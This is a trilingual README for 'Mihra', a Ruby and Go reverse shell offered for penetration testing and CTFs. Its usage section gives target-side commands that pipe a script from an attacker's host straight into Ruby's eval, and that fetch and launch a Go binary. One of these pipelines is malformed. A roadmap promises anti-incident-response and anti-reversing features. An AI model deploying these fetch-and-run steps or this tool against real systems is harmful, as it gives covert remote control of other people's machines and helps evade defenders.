# Mihra
🇧🇷 - Uma reverse shell construída em ruby para o testes de penetração. Agora para ambientes onde pode ser utilizado a linguagem interpretada e compilada 
Utiliza um sistema onde a porta de conexão é fornecida pelo alvo, e não pelo atacante, possibilitando o uso de proxy's e conexões em intervalos, devido ao loop de execução.


🇬🇧 -A reverse shell built in Ruby for penetration testing. Now for environments where the interpreted and compiled language can be used.
It uses a system where the connection port is provided by the target, not the attacker, allowing the use of proxies and connections at intervals, due to the execution loop.

🇨🇳 一个用Ruby编写的用于渗透测试的反向shell。现在适用于可以使用解释型和编译型语言的环境。
它使用一个系统，其中连接端口由目标提供，而不是攻击者提供，允许使用代理和在间隔内进行连接，这是由于执行循环的原因。

## Usage:
> RSA:
```
 # Generate the listener private key
openssl genrsa -out listener_private_key.pem 8192

  # Generate the listener public key
openssl rsa -in listener_private_key.pem -pubout -out listener_public_key.pem

  # Generate the server private key
openssl genrsa -out server_private_key.pem 8192

  # Generate the server public key
openssl rsa -in server_private_key.pem -pubout -out server_public_key.pem
```
> Target:
```
curl http://<attacker_ip>/target.rb | ruby -e 'eval(STDIN.read)'
#or just download it.

=========================
        GOLANG:
=========================
go build main.go

curl http://<attacker_ip>/target | chmod 777 target | /path/to/target --port <port>

=========================
```

> Attacker
```
ruby attacker.rb
#or
proxychains4 attacker.rb
=========================
        GOLANG:
=========================
go build aaa.go

./file --server <server> --port <port>

```
![image1](https://github.com/Lowkkii/Athenas/blob/main/main.png)
### soon:
* Binary files.
* anti incident-response.
* anti reversing.
* 
# Disclaimer
A perfect reverse shell for CTF's.

This repository and the tool contained within it are provided strictly for academic and research purposes. The use of this tool for any purpose that violates applicable laws or local, national, or international regulations is strictly prohibited. The contributors to this repository bear no responsibility for how this tool is used and the consequences arising from its use.

By using this tool, you agree to do so strictly for academic purposes and acknowledge that you are responsible for complying with all applicable laws and regulations during the use of this tool. This repository and its contributors do not endorse or promote any illegal or harmful activities.

Any misuse of this tool is not the responsibility of the contributors to this repository. If you do not agree with these terms or are unwilling to use it strictly for academic purposes, please do not proceed with the use of this tool.
